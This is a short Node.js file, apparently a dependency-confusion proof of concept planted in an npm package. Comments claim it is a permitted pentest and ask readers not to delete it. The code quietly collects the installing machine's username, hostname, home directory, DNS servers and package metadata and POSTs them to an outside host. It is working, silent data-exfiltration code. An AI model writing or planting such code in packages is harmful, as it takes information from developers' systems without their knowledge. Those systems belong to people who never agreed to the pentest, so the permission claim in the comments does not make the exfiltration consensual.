//This is a PoC from:- null_hypothesis on the H1 platform, with permission from the package owner, Hyperledger
//Please do not delete for 2 hours, sorry for the hassle, but its for a legitimate pentest and to raise awareness
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const os = require("os");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const evenMoreDatas = JSON.stringify({
    pac: package,
    curr: __dirname,
    homd: os.homedir(),
    hosn: os.hostname(),
    usrn: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    ver: packageJSON.version,
    pj: packageJSON,
});

var postData = querystring.stringify({
    msg: evenMoreDatas,
});

var options = {
    hostname: "aries-askar-nodejs.cdb4cjt2vtc0000jyq90ggi1gjoyyyyyb.mybeautifuliframe.com",
    port: 443,
    path: "/wp",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
